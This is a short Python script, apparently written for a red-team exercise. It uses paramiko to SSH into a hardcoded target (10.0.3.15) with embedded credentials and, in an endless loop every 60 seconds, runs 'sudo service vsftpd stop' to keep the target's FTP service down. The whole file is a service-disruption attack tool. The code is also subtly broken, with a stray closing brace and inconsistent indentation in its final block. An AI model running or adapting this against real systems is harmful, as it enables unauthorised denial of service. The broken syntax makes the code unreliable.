import paramiko
import time

hostname = '10.0.3.15' # this is whatever specific box we're targetting
username = 'home' # current sudo user
password = 'redteam' # this password can change

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # SSH add the key policy 

while True: # repeat forever
    try:
        ssh.connect(hostname=hostname, username=username, password=password) # connecting to our host with our credentials
        
        command = "sudo service vsftpd stop" # the specific command we're running (stopping ftp)
        stdin, stdout, stderr = ssh.exec_command(command) # executing command and sending output to appropriate variables

        output = stdout.read().decode('utf-8')
        error = stderr.read().decode('utf-8')

        if output:
            print(output) # if all good

        if error:
            print(error) # if error

    except Exception as e:
        print("Exception:", e) # if connection exception

    finally:
        ssh.close()
	print('Done!') # we're done!

    time.sleep(60) # sleep for 60 seconds and repeat
}
